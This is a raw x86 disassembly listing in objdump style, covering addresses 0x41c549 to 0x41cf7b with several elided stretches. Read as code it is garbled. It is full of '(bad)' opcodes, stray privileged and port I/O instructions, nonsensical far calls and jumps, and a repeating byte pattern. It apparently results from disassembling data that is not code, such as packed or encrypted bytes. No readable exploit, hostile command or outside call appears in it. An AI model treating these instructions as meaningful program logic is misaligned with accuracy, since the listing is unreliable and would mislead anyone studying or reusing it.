  41c549:	adc    edx,DWORD PTR [ebx+0x5d12c20f]
  41c54f:	fs xchg ecx,eax
  41c551:	push   ecx
  41c552:	pop    ds
  41c553:	ret    
  41c554:	mov    edi,0x28b910e4
  41c559:	shl    cl,1
  41c55b:	cld    
  41c55c:	dec    ebp
  41c55d:	sub    bh,BYTE PTR [esi-0x3ef5f906]
  41c563:	inc    edi
  41c564:	xor    ah,BYTE PTR [esi+0x79]
  41c567:	sar    DWORD PTR [eax+eax*1+0x7e],1
  41c56b:	clc    
  41c56c:	stos   BYTE PTR es:[edi],al
  41c56d:	inc    edi
  41c56e:	lock clc 
  41c570:	jle    0x41c5b1
  41c572:	push   edi
  41c573:	repz pop es
  41c575:	mov    es,WORD PTR [esi-0x294dd8cf]
  41c57b:	ins    DWORD PTR es:[edi],dx
  41c57c:	arpl   dx,si
  41c57e:	call   0x663:0xc011e0fa
  41c585:	stc    
  41c586:	mov    bh,0xac
  41c588:	fucomp st(1)
  41c58a:	test   eax,0x239ed77a
  41c58f:	pop    eax
  41c590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c591:	push   esp
  41c592:	xlat   BYTE PTR ds:[ebx]
  41c593:	(bad)  
  41c594:	imul   edx,DWORD PTR [edi+0x732cb20e],0x61f4b4b0
  41c59e:	sub    cl,BYTE PTR [edx+0x5a88e65c]
  41c5a4:	sbb    edx,DWORD PTR [ecx+0x112e41ac]
  41c5aa:	aaa    
  41c5ab:	inc    esp
  41c5ac:	add    esi,edx
  41c5ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5af:	sub    ah,ch
  41c5b1:	shl    BYTE PTR [edx],cl
  41c5b3:	es xor al,0xab
  41c5b6:	cmp    BYTE PTR [eax],ah
  41c5b8:	sbb    DWORD PTR [eax+0x43],ecx
  41c5bb:	fmul   DWORD PTR [edi-0x378712c0]
  41c5c1:	or     ebx,DWORD PTR [eax]
  41c5c3:	jp     0x41c54c
  41c5c5:	xchg   al,bh
  41c5c7:	rcl    BYTE PTR es:[ebx+0x2d],cl
  41c5cb:	clc    
  41c5cc:	mov    edi,0xba4f2a3a
  41c5d1:	ja     0x41c64a
  41c5d3:	add    al,0xf
  41c5d5:	adc    BYTE PTR [edx+edi*8+0x546a4726],bl
  41c5dc:	(bad)  [edx+0x1086e079]
  41c5e2:	out    0x8a,eax
  41c5e4:	adc    DWORD PTR ds:0x215ca503,esi
  41c5ea:	cmp    eax,esp
  41c5ec:	inc    esp
  41c5ed:	jbe    0x41c5ef
	...
  41c653:	add    BYTE PTR [eax],al
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0x9bc856c
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	jno    0x41c63a
  41c670:	repz jno 0x41c645
  41c673:	add    al,0x1f
  41c675:	adc    ebp,ebx
  41c677:	add    DWORD PTR [ebx+0x59cde2b5],0x1b
  41c67e:	(bad)  
  41c67f:	in     eax,0x2c
  41c681:	adc    esp,DWORD PTR [ecx-0x47]
  41c684:	les    esp,FWORD PTR [eax-0x59]
  41c687:	push   es
  41c688:	cmp    BYTE PTR [ebx],bh
  41c68a:	outs   dx,DWORD PTR ds:[esi]
  41c68b:	xchg   esp,eax
  41c68c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c68d:	popf   
  41c68e:	or     DWORD PTR [esi],0xd5d95ecb
  41c694:	adc    cl,BYTE PTR [ebx]
  41c696:	popa   
  41c697:	adc    al,0xc2
  41c699:	mov    fs,ebx
  41c69b:	(bad)  [esi]
  41c69d:	add    DWORD PTR [ebx],esp
  41c69f:	and    al,0xe3
  41c6a1:	loop   0x41c700
  41c6a3:	sub    ecx,DWORD PTR [edx+0x7b14caa9]
  41c6a9:	dec    edx
  41c6aa:	push   edi
  41c6ab:	and    BYTE PTR [ebp+0x2a],cl
  41c6ae:	test   eax,0xb3a90244
  41c6b3:	mov    ds:0x4a8cfca1,al
  41c6b8:	bound  ebx,QWORD PTR [ebp-0x2f758e34]
  41c6be:	jb     0x41c727
  41c6c0:	dec    ecx
  41c6c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6c2:	mov    ds:0xf12395d2,eax
  41c6c7:	xchg   ecx,eax
  41c6c8:	out    dx,al
  41c6c9:	pop    ss
  41c6ca:	loop   0x41c72a
  41c6cc:	adc    eax,0x90fd5597
  41c6d1:	int    0x72
  41c6d3:	clc    
  41c6d4:	push   eax
  41c6d5:	mov    ebx,DWORD PTR [edx+0x21]
  41c6d8:	imul   esi,edi,0xffffffbf
  41c6db:	arpl   WORD PTR [edx-0x6c21909e],ax
  41c6e1:	retf   0x30b4
  41c6e4:	jns    0x41c759
  41c6e6:	aaa    
  41c6e7:	pop    es
  41c6e8:	and    ecx,esp
  41c6ea:	int3   
  41c6eb:	aaa    
  41c6ec:	jo     0x41c68d
  41c6ee:	sbb    cl,dl
  41c6f0:	ds mov ah,0x99
  41c6f3:	and    DWORD PTR [ebx+0x4c],esi
  41c6f6:	adc    BYTE PTR [edx],dl
  41c6f8:	xor    DWORD PTR [eax+0x2f],edi
  41c6fb:	inc    edx
  41c6fc:	cmp    BYTE PTR [edx],ah
  41c6fe:	fwait
  41c6ff:	mov    ebx,0xa79678e1
  41c704:	icebp  
  41c705:	add    cl,BYTE PTR [eax+0x75f3bd2b]
  41c70b:	jns    0x41c74d
  41c70d:	mov    dl,0x4
  41c70f:	sbb    ecx,DWORD PTR [ecx]
  41c711:	(bad)  
  41c712:	and    DWORD PTR [ecx],esp
  41c714:	push   cs
  41c715:	fcomip st,st(5)
  41c717:	mov    esi,0x8b26e4ce
  41c71c:	sub    BYTE PTR [ecx],ah
  41c71e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c71f:	pusha  
  41c720:	fnstcw WORD PTR ss:[edi]
  41c723:	pop    esp
  41c724:	(bad)  
  41c725:	enter  0xaaf7,0xa1
  41c729:	pop    eax
  41c72a:	dec    esi
  41c72b:	sub    ecx,DWORD PTR [ebx-0x47]
  41c72e:	pop    esp
  41c72f:	mov    ecx,0x137edcaa
  41c734:	lods   al,BYTE PTR ds:[esi]
  41c735:	jnp    0x41c6d9
  41c737:	fsub   DWORD PTR [ebp-0x72]
  41c73a:	je     0x41c71e
  41c73c:	cli    
  41c73d:	imul   ebx,DWORD PTR [eax-0x592e825d],0xfffffffc
  41c744:	test   al,0xd8
  41c746:	pop    es
  41c747:	clc    
  41c748:	loopne 0x41c730
  41c74a:	or     BYTE PTR [ebp-0x1abd6fa6],0x52
  41c751:	push   ebx
  41c752:	cld    
  41c753:	cld    
  41c754:	pop    esp
  41c755:	std    
  41c756:	out    0x75,al
  41c758:	pushf  
  41c759:	gs out dx,al
  41c75b:	loope  0x41c7d9
  41c75d:	adc    al,0x3e
  41c75f:	jp     0x41c722
  41c761:	mov    bh,0xfe
  41c763:	mov    ch,0xf1
  41c765:	scas   al,BYTE PTR es:[edi]
  41c766:	jmp    ebx
  41c768:	js     0x41c7c5
  41c76a:	sub    esi,DWORD PTR [edi+0xa42]
	...
  41c7d4:	add    BYTE PTR [eax],al
  41c7d6:	fiadd  DWORD PTR [ecx]
  41c7d8:	ret    0xdb86
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	addr16 push 0xffffffc0
  41c7e5:	frstor [edi+0x32]
  41c7e8:	add    DWORD PTR [eax],eax
  41c7ea:	add    BYTE PTR [ecx],al
  41c7ec:	add    BYTE PTR [eax],al
  41c7ee:	pop    ds
  41c7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7f0:	dec    edx
  41c7f1:	sub    BYTE PTR [eax-0x1649763d],ah
  41c7f7:	aas    
  41c7f8:	mov    WORD PTR [edx-0x73],ss
  41c7fb:	mov    BYTE PTR [edx-0x7cf9a18e],cl
  41c801:	cdq    
  41c802:	fwait
  41c803:	cdq    
  41c804:	add    al,0x83
  41c806:	push   esi
  41c807:	push   es
  41c808:	ds pop edx
  41c80a:	das    
  41c80b:	jge    0x41c7d3
  41c80d:	push   ecx
  41c80e:	std    
  41c80f:	add    eax,0x1c36871
  41c814:	mov    dh,0x79
  41c816:	mov    esp,0x6acc75c1
  41c81b:	outs   dx,DWORD PTR ds:[esi]
  41c81c:	or     ah,BYTE PTR [ebp+edi*4+0x72447879]
  41c823:	clc    
  41c824:	out    0x7c,al
  41c826:	popa   
  41c827:	inc    ecx
  41c828:	imul   esp,ecx,0x553446d6
  41c82e:	cld    
  41c82f:	(bad)  
  41c830:	xchg   ecx,eax
  41c831:	or     ch,al
  41c833:	jg     0x41c80c
  41c835:	dec    ebx
  41c837:	sub    DWORD PTR [esi-0x6765bc4f],0x785872ee
  41c841:	mov    bl,0x44
  41c843:	scas   eax,DWORD PTR es:[edi]
  41c844:	cmp    al,0xfa
  41c846:	dec    edi
  41c847:	call   0x96984c38
  41c84c:	mov    ds,WORD PTR [ebp+eiz*4-0x77]
  41c850:	aam    0x64
  41c852:	sbb    al,BYTE PTR [edi+0x0]
  41c855:	pop    ss
  41c856:	jmp    0xfe49:0x1889d040
  41c85d:	adc    DWORD PTR [eax-0x43ab3429],ecx
  41c863:	arpl   WORD PTR [esi+0x1d02ad5f],bp
  41c869:	adc    BYTE PTR [eax+0x6e5fde86],bl
  41c86f:	jecxz  0x41c8af
  41c871:	or     BYTE PTR [eax-0x5e],dl
  41c874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c875:	dec    ebx
  41c876:	bound  ebx,QWORD PTR ds:0x73f6159c
  41c87c:	(bad)  
  41c87d:	inc    esp
  41c87f:	add    eax,0xa57df2d4
  41c884:	jmp    0x85626b21
  41c889:	push   ebp
  41c88a:	cmp    al,dl
  41c88c:	(bad)  
  41c88d:	out    0xc3,eax
  41c88f:	adc    edi,ecx
  41c891:	daa    
  41c892:	adc    eax,0x1e2afed3
  41c897:	mov    dh,0xc9
  41c899:	cmp    esi,DWORD PTR [ebx]
  41c89b:	int    0x7e
  41c89d:	push   ebx
  41c89e:	sti    
  41c89f:	rol    DWORD PTR [ebp+0x2888b9e9],1
  41c8a5:	test   esi,esi
  41c8a7:	pop    ss
  41c8a8:	xchg   DWORD PTR [eax-0x2b4e7510],esp
  41c8ae:	stc    
  41c8af:	push   ecx
  41c8b0:	stc    
  41c8b1:	or     esi,DWORD PTR [edi-0x572f726c]
  41c8b7:	xchg   ecx,eax
  41c8b8:	cmp    ebx,DWORD PTR [edx+esi*4+0x2fdedc6c]
  41c8bf:	cs jbe 0x41c885
  41c8c2:	adc    dl,bl
  41c8c4:	pushf  
  41c8c5:	push   ebx
  41c8c6:	adc    ecx,esp
  41c8c8:	aas    
  41c8c9:	dec    esi
  41c8ca:	test   eax,0xc1f1055e
  41c8cf:	or     DWORD PTR [esi],esp
  41c8d1:	mov    WORD PTR [edx-0x67],gs
  41c8d4:	or     ecx,0x42fa337c
  41c8da:	pop    ds
  41c8db:	in     al,0x9c
  41c8dd:	mov    ds:0x319d712e,eax
  41c8e2:	(bad)  
  41c8e3:	aad    0x21
  41c8e5:	or     eax,DWORD PTR [ecx+0x41]
  41c8e8:	cmp    DWORD PTR [ebp+0x4],esp
  41c8eb:	or     ecx,DWORD PTR [ebp+0x66]
	...
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	adc    ebx,DWORD PTR [eax+0x336798fc]
  41c968:	add    DWORD PTR [eax],eax
  41c96a:	add    BYTE PTR [ecx],al
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	xchg   ecx,eax
  41c96f:	dec    esp
  41c970:	sub    eax,0x18da0ca2
  41c975:	sub    ebp,esp
  41c977:	popf   
  41c978:	loope  0x41c9e8
  41c97a:	fadd   QWORD PTR [edx+0x4b]
  41c97d:	div    DWORD PTR [esi+0x45]
  41c980:	dec    ecx
  41c981:	adc    al,0xdd
  41c983:	jge    0x41c9ba
  41c985:	mov    ebx,eax
  41c987:	push   esp
  41c988:	mov    al,ds:0xac7e98e0
  41c98d:	mov    ebx,0xc1887666
  41c992:	inc    ebx
  41c993:	xchg   ebx,eax
  41c994:	and    ecx,ebp
  41c996:	popa   
  41c997:	pop    ebp
  41c998:	popa   
  41c999:	push   eax
  41c99a:	lahf   
  41c99b:	(bad)  
  41c99c:	and    edx,esp
  41c99e:	xor    DWORD PTR [ecx-0x38421e9f],ebp
  41c9a4:	push   edi
  41c9a5:	jbe    0x41c979
  41c9a7:	add    DWORD PTR [ecx+0x1a225fc1],0x98ec6ea2
  41c9b1:	mov    DWORD PTR [ebx+edx*2-0x2b],ebp
  41c9b5:	cmp    eax,0xfd7d1467
  41c9ba:	add    al,0x68
  41c9bc:	gs pop eax
  41c9be:	sbb    al,0x1b
  41c9c0:	or     ebx,DWORD PTR ds:0x6db27d19
  41c9c6:	sbb    cl,BYTE PTR [esi]
  41c9c8:	sub    dl,BYTE PTR [ecx-0x32]
  41c9cb:	adc    BYTE PTR [ecx-0x23],ah
  41c9ce:	add    esp,eax
  41c9d0:	adc    al,0x23
  41c9d2:	in     al,0xb1
  41c9d4:	sbb    DWORD PTR [esi+0x1e],edx
  41c9d7:	dec    edx
  41c9d8:	push   eax
  41c9d9:	jp     0x41c9ec
  41c9db:	add    eax,0xf4508a5a
  41c9e0:	jg     0x41c9fe
  41c9e2:	fmul   QWORD PTR [ecx+0x5d]
  41c9e5:	fsub   DWORD PTR [ebp-0x689d9de4]
  41c9eb:	xchg   edx,eax
  41c9ec:	repz popa 
  41c9ee:	push   es
  41c9ef:	jbe    0x41c9b1
  41c9f1:	out    dx,eax
  41c9f2:	mov    eax,0x1acb873
  41c9f7:	adc    DWORD PTR [eax+0x4b],ebp
  41c9fa:	retf   
  41c9fb:	add    DWORD PTR ds:0xf0b36fba,eax
  41ca01:	hlt    
  41ca02:	cli    
  41ca03:	call   0x6e68:0x56e4d472
  41ca0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca0b:	es jnp 0x41ca32
  41ca0e:	xor    dl,ah
  41ca10:	pop    ss
  41ca11:	xor    DWORD PTR ds:0xe620d698,eax
  41ca17:	mov    edx,0x260fa4f0
  41ca1c:	rcr    BYTE PTR [ecx+0x78bc687b],cl
  41ca22:	mov    ch,0xa2
  41ca24:	jno    0x41c9cd
  41ca26:	mov    ebx,0x5b90d65f
  41ca2b:	sbb    bh,BYTE PTR [eax-0x2946919f]
  41ca31:	adc    al,0x72
  41ca33:	jp     0x41ca93
  41ca35:	pusha  
  41ca36:	adc    DWORD PTR [edi-0x64f90af7],ecx
  41ca3c:	and    eax,0x5f9133b0
  41ca41:	sbb    eax,0xa6b3f33e
  41ca46:	out    0x5c,eax
  41ca48:	jo     0x41ca53
  41ca4a:	cmp    eax,0x133ad70c
  41ca4f:	push   0x3abb6ac9
  41ca54:	mov    bl,0x3f
  41ca56:	arpl   WORD PTR [eax-0x7f],sp
  41ca59:	pcmpeqb mm5,QWORD PTR [edx-0x60f7948e]
  41ca60:	mov    eax,0x9477da7
  41ca65:	outs   dx,BYTE PTR ds:[esi]
  41ca66:	std    
  41ca67:	mov    BYTE PTR [ebx],0xa3
  41ca6a:	jge    0x41cac9
  41ca6c:	jge    0x41ca74
	...
  41cad6:	lock retf 0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	(bad)  
  41cae3:	call   0x34a9b12c
  41cae8:	add    DWORD PTR [eax],eax
  41caea:	add    BYTE PTR [ecx],al
  41caec:	add    BYTE PTR [eax],al
  41caee:	mov    ecx,0xbe17bb78
  41caf3:	ret    0x9db0
  41caf6:	xor    al,0x99
  41caf8:	jno    0x41cb0a
  41cafa:	popf   
  41cafb:	aas    
  41cafc:	shl    DWORD PTR [edx-0x5d1eab19],0x7a
  41cb03:	push   cs
  41cb04:	repnz pop eax
  41cb06:	xor    esp,ecx
  41cb08:	inc    esi
  41cb09:	sub    ch,0x75
  41cb0c:	push   0xffffff83
  41cb0e:	iret   
  41cb0f:	or     al,0x89
  41cb11:	ror    DWORD PTR [esi],0x32
  41cb14:	jp     0x41cafc
  41cb16:	sbb    bh,bl
  41cb18:	jo     0x41cb0c
  41cb1a:	xchg   ebp,eax
  41cb1b:	sub    BYTE PTR ds:0x22e32a6d,ch
  41cb21:	popf   
  41cb22:	retf   0xd554
  41cb25:	stos   DWORD PTR es:[edi],eax
  41cb26:	sbb    ch,BYTE PTR [ebx-0x4f382766]
  41cb2c:	lods   al,BYTE PTR ds:[esi]
  41cb2d:	pop    ecx
  41cb2e:	and    ch,BYTE PTR [ebx-0x7fed92b8]
  41cb34:	cmp    bh,ah
  41cb36:	push   edx
  41cb37:	and    WORD PTR [edx+0x33],bx
  41cb3b:	mov    dh,BYTE PTR [edi-0x128ab4ee]
  41cb41:	loopne 0x41cb58
  41cb43:	(bad)  
  41cb44:	xor    DWORD PTR [ebx-0x7b],edi
  41cb47:	sub    BYTE PTR ds:0x7f6caae1,dh
  41cb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb4e:	pop    ebp
  41cb4f:	pusha  
  41cb50:	mov    al,ds:0x93ea8e53
  41cb55:	into   
  41cb56:	mov    edi,0x3f85fa00
  41cb5b:	cld    
  41cb5c:	sbb    dh,cl
  41cb5e:	add    DWORD PTR [ebx-0x5e7e2a1e],esp
  41cb64:	rol    BYTE PTR [ebp-0x480e3861],0x73
  41cb6b:	xor    DWORD PTR [edx-0x2feff259],edx
  41cb71:	sub    ch,BYTE PTR [ecx+0x72f2e513]
  41cb77:	enter  0xd263,0x28
  41cb7b:	add    BYTE PTR [esi+0x3d],0x17
  41cb7f:	mov    bl,BYTE PTR [edx+0x24]
  41cb82:	icebp  
  41cb83:	ror    ch,1
  41cb85:	mov    al,0xf3
  41cb87:	mov    ds:0x523fad32,al
  41cb8c:	loop   0x41cb5e
  41cb8e:	lea    edi,[ebx-0x70]
  41cb91:	cmp    BYTE PTR [eax-0x740c089e],ch
  41cb97:	mov    dl,dl
  41cb99:	pop    edx
  41cb9a:	shr    BYTE PTR [ebx+edi*1],cl
  41cb9d:	pop    ecx
  41cb9e:	adc    dh,BYTE PTR [ecx]
  41cba0:	mov    ds:0x83240878,al
  41cba5:	sar    esp,0x6b
  41cba8:	dec    edx
  41cba9:	mov    DWORD PTR [ebx],eax
  41cbab:	dec    esp
  41cbac:	clc    
  41cbad:	push   0x5d
  41cbaf:	mov    BYTE PTR ss:[esi+ebx*4],bh
  41cbb3:	mov    esi,0x7f917847
  41cbb8:	xchg   edi,eax
  41cbb9:	push   ds
  41cbba:	inc    ebp
  41cbbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbbc:	or     esi,edx
  41cbbe:	mov    cl,0xc4
  41cbc0:	or     BYTE PTR [edi],cl
  41cbc2:	mov    ebp,0x7a5176f
  41cbc7:	and    al,0xfe
  41cbc9:	(bad)  
  41cbca:	std    
  41cbcb:	dec    DWORD PTR [ebx-0x53]
  41cbce:	adc    esi,edx
  41cbd0:	cmp    ebp,DWORD PTR [ebx]
  41cbd2:	pop    eax
  41cbd3:	jge    0x41cbaf
  41cbd5:	repz mov ah,0xf0
  41cbd8:	sub    BYTE PTR [ebp+0x14c32f8d],cl
  41cbde:	inc    ecx
  41cbdf:	push   ecx
  41cbe0:	mov    bl,0xb9
  41cbe2:	dec    edi
  41cbe3:	pop    es
  41cbe4:	bound  ebx,QWORD PTR [ecx]
  41cbe6:	arpl   WORD PTR [edi-0x1ee0452a],sp
  41cbec:	pop    eax
  41cbed:	adc    al,0x0
	...
  41cc53:	add    BYTE PTR [eax],al
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x151b3722
  41cc65:	lahf   
  41cc66:	addr16 xor eax,0x1000001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	mov    al,ds:0x8e21ffc2
  41cc73:	jge    0x41ccc1
  41cc75:	repz xor al,0x8e
  41cc78:	ret    
  41cc79:	fwait
  41cc7a:	call   FWORD PTR ds:0x1cfa686f
  41cc80:	adc    eax,0x7b4cc38b
  41cc85:	fimul  WORD PTR [edi+0x4d0df2d7]
  41cc8b:	cmp    dh,BYTE PTR [ebx-0x241ac924]
  41cc91:	cmp    dh,BYTE PTR [esp+eax*1+0x4d]
  41cc95:	ins    DWORD PTR es:[edi],dx
  41cc96:	push   edi
  41cc97:	dec    esp
  41cc98:	pop    ebp
  41cc99:	cs mov esi,0x37ce2523
  41cc9f:	jns    0x41ccea
  41cca1:	mov    esi,0x2e348bb9
  41cca6:	ret    
  41cca7:	out    dx,al
  41cca8:	iret   
  41cca9:	out    dx,eax
  41ccaa:	les    edx,FWORD PTR [ecx]
  41ccac:	ror    BYTE PTR [ebp+0x78473fa4],1
  41ccb2:	(bad)  
  41ccb3:	fist   DWORD PTR [edx+0x1cdc3eab]
  41ccb9:	adc    DWORD PTR [edi+eiz*8+0x2cb06879],esp
  41ccc0:	xchg   edi,eax
  41ccc1:	test   BYTE PTR [eax-0x4f8f2471],dh
  41ccc7:	repnz xchg ebx,edx
  41ccca:	or     bl,al
  41cccc:	add    BYTE PTR [edx],ah
  41ccce:	adc    eax,0xee3b3495
  41ccd3:	ret    
  41ccd4:	pop    esi
  41ccd5:	and    ah,cl
  41ccd7:	pop    ds
  41ccd8:	sbb    DWORD PTR [esi],edx
  41ccda:	and    BYTE PTR [edi+0x3c2520d7],0xc8
  41cce1:	int3   
  41cce2:	mov    ebx,0xeada4db1
  41cce7:	call   0xe1e6:0xb2303caf
  41ccee:	push   eax
  41ccef:	add    ebp,DWORD PTR [ebx+0x18]
  41ccf2:	pop    esi
  41ccf3:	fnstsw WORD PTR [ebp-0x34]
  41ccf6:	pop    eax
  41ccf7:	and    ah,BYTE PTR [esi+0x8]
  41ccfa:	dec    ebp
  41ccfb:	aas    
  41ccfc:	test   DWORD PTR [edx-0x41af06f],esp
  41cd02:	ficom  WORD PTR [ebx+0x6]
  41cd05:	inc    edi
  41cd06:	push   0xffffffeb
  41cd08:	inc    ecx
  41cd09:	(bad)  
  41cd0a:	adc    bl,BYTE PTR [edi-0x24]
  41cd0d:	pop    ebp
  41cd0e:	jg     0x41cd44
  41cd10:	sti    
  41cd11:	or     BYTE PTR [eax-0xdf60461],bh
  41cd17:	add    al,0x1f
  41cd19:	push   ecx
  41cd1a:	push   ebp
  41cd1b:	fwait
  41cd1c:	cmp    DWORD PTR [esi],edx
  41cd1e:	call   DWORD PTR [esi+0x4c]
  41cd21:	mov    eax,DWORD PTR [edi+edi*2]
  41cd24:	(bad)  
  41cd25:	jecxz  0x41cd9e
  41cd27:	mov    WORD PTR [edi+0x24],?
  41cd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd2b:	jecxz  0x41cd66
  41cd2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd2e:	pop    es
  41cd2f:	fld    TBYTE PTR [esi]
  41cd31:	pop    ebx
  41cd32:	lods   al,BYTE PTR ds:[esi]
  41cd33:	pushw  ds
  41cd35:	(bad)  
  41cd36:	xor    ebp,DWORD PTR [edx]
  41cd38:	shl    BYTE PTR [edx],cl
  41cd3a:	fiadd  WORD PTR [esi]
  41cd3c:	js     0x41cd6d
  41cd3e:	fs pop edx
  41cd40:	out    0x81,al
  41cd42:	loop   0x41cdb3
  41cd44:	cmp    BYTE PTR [ecx],bh
  41cd46:	adc    esp,esp
  41cd48:	push   0x1242b3ab
  41cd4d:	call   0x42283d33
  41cd52:	test   DWORD PTR [esi-0x6ebefec3],esp
  41cd58:	jmp    0xcc19:0x11c8874f
  41cd5f:	test   DWORD PTR [ebp+0x6e],edi
  41cd62:	and    eax,0xfc6f5031
  41cd67:	mov    cl,0x7
  41cd69:	(bad)  [ebp+eax*2-0x7a]
  41cd6d:	inc    DWORD PTR [eax]
	...
  41cdd3:	add    BYTE PTR [eax],al
  41cdd5:	add    BYTE PTR [eax-0x67],ah
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	jecxz  0x41cdd1
  41cde4:	outs   dx,DWORD PTR ds:[esi]
  41cde5:	and    BYTE PTR [edi+0x36],0x1
  41cde9:	add    BYTE PTR [eax],al
  41cdeb:	add    DWORD PTR [eax],eax
  41cded:	add    dl,cl
  41cdef:	rcl    DWORD PTR [edi+0x45],cl
  41cdf2:	lea    esp,[edi]
  41cdf4:	iret   
  41cdf5:	adc    DWORD PTR ds:0xe8e4ca01,esi
  41cdfb:	(bad)  
  41cdfc:	call   0xa10685bd
  41ce01:	mov    BYTE PTR [edi-0x59f500d4],ah
  41ce07:	pop    ecx
  41ce08:	sbb    eax,0x56b7dd23
  41ce0d:	js     0x1ba45d81
  41ce13:	mov    dl,BYTE PTR [ecx-0x32051766]
  41ce19:	retf   
  41ce1a:	dec    esp
  41ce1b:	adc    dh,BYTE PTR [ecx+ecx*2-0x66]
  41ce1f:	stos   BYTE PTR es:[edi],al
  41ce20:	loop   0x41ce4c
  41ce22:	or     ecx,esp
  41ce24:	int    0xa2
  41ce26:	icebp  
  41ce27:	loope  0x41ce17
  41ce29:	daa    
  41ce2a:	sbb    dh,BYTE PTR [edx+0xee81965]
  41ce30:	cmp    edi,DWORD PTR [eax+edx*4+0x29]
  41ce34:	push   es
  41ce35:	loop   0x41ce61
  41ce37:	inc    eax
  41ce38:	cld    
  41ce39:	shr    BYTE PTR [ecx],1
  41ce3b:	jge    0x41cdea
  41ce3d:	imul   eax,DWORD PTR [ebx-0x60a63bac],0x52
  41ce44:	nop
  41ce45:	add    eax,0x820e69bc
  41ce4a:	adc    al,0x60
  41ce4c:	pop    ebp
  41ce4d:	sub    esi,DWORD PTR [esi]
  41ce4f:	div    BYTE PTR [edi+edi*2]
  41ce52:	inc    edi
  41ce53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce54:	xor    dh,BYTE PTR [ebx+0x491e81fc]
  41ce5a:	dec    esi
  41ce5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce5c:	jno    0x41ce45
  41ce5e:	xchg   esi,eax
  41ce5f:	mov    dh,0x9a
  41ce61:	icebp  
  41ce62:	lock nop
  41ce64:	or     BYTE PTR [ebx+0x2a],0x4
  41ce68:	in     eax,0x24
  41ce6a:	and    eax,0xc5d271a
  41ce6f:	fsubr  st,st(5)
  41ce71:	or     al,0x7c
  41ce73:	inc    edx
  41ce74:	jle    0x41ce39
  41ce76:	jmp    0xc281:0x5e0c57b3
  41ce7d:	push   cs
  41ce7e:	mov    esp,0x5479903f
  41ce83:	or     BYTE PTR [edi+0x4cecfd2b],0xba
  41ce8a:	clc    
  41ce8b:	and    bh,BYTE PTR [ebx+edi*8+0x2330d5f0]
  41ce92:	mov    es,WORD PTR [edi+0x59]
  41ce95:	inc    edx
  41ce96:	imul   edi,DWORD PTR [ecx-0x19f10442],0xffffffea
  41ce9d:	mov    ds:0xa6445469,al
  41cea2:	fwait
  41cea3:	and    ch,BYTE PTR [esi-0x6b1651df]
  41cea9:	jmp    0x41cf07
  41ceab:	jg     0x41ceeb
  41cead:	cwde   
  41ceae:	rcl    BYTE PTR [ebx+0x6e],cl
  41ceb1:	repnz push ebx
  41ceb3:	push   es
  41ceb4:	add    DWORD PTR [eax],edx
  41ceb6:	jne    0x41ce78
  41ceb8:	inc    ebx
  41ceb9:	dec    esi
  41ceba:	aad    0x7c
  41cebc:	das    
  41cebd:	inc    ecx
  41cebe:	lods   al,BYTE PTR ds:[esi]
  41cebf:	inc    eax
  41cec0:	test   DWORD PTR [ebp+0x41a27187],esp
  41cec6:	mov    ah,0x6f
  41cec8:	daa    
  41cec9:	fcom   DWORD PTR [ebp+0x58471bf8]
  41ced0:	dec    edi
  41ced1:	xor    ah,bh
  41ced3:	jge    0x41cedb
  41ced5:	shl    DWORD PTR [eax-0x57],cl
  41ced8:	test   al,0x0
  41ceda:	test   DWORD PTR [esi+0x4fae5377],0xf0352f31
  41cee4:	addr16 je 0x41cf18
  41cee7:	call   0x9eb1:0x64a742c8
	...
  41cf56:	pop    es
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	and    eax,0x67bab44d
  41cf67:	aaa    
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	dec    esp
  41cf6f:	sub    ebx,DWORD PTR [eax]
  41cf71:	pop    es
  41cf72:	pop    edi
  41cf73:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41cf75:	push   cs
  41cf76:	adc    al,0xed
  41cf78:	fidivr WORD PTR [ecx+0x38]
  41cf7b:	xchg   ecx,eax
